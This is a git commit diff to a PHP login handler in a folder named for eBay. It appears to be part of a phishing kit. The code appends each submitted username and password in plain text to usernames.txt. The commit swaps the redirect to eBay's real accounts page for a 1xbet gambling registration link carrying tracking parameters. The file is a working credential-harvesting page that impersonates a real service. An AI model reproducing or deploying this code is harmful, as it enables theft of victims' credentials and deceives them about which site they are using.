d5919e4ccb28615e0acb72d07ea3d80e37502e22
faruq2ds <82174288+faruq2ds@users.noreply.github.com>
2021-04-08 19:04:10 +0100

    Update login.php

--- websites/ebay/login.php
+++ websites/ebay/login.php
@@ -1,5 +1,5 @@
 <?php
 
     file_put_contents("usernames.txt", "Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://accounts.ebay.com/acctxs/user');
+header('Location: https://1xbet.ng/en/registration/?tag=d_559183m_2902c_Search_Gambling.&gclid=CjwKCAjw07qDBhBxEiwA6pPbHgjUgFG-eqdxM3upj70cx9LC7Ps8Ze3Y6sxmNvyZ6MPnJI_A7bsAVBoCnpIQAvD_BwE');
 exit();
